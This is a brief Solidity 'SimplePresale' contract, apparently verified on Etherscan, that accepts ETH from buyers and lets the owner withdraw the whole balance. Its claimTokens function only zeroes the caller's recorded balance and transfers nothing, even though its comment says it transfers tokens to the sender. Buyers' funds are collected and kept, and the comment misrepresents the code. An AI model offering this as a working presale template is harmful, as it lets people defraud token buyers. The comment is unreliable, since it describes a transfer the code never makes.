/**
 *Submitted for verification at Etherscan.io on 2023-06-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimplePresale {
    address payable public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = payable(msg.sender);
    }

    function buyTokens() external payable {
        // For this simple example, we're just giving 1 token per wei.
        // Note: this does not represent a real token, just a balance within this contract.
        balances[msg.sender] += msg.value;
    }

    function claimTokens() external {
        require(balances[msg.sender] > 0, "No tokens to claim");

        // Transfers the balance of tokens to the sender
        balances[msg.sender] = 0;
    }

    function withdrawETH() external {
        require(msg.sender == owner, "Only the owner can withdraw");
        owner.transfer(address(this).balance);
    }
}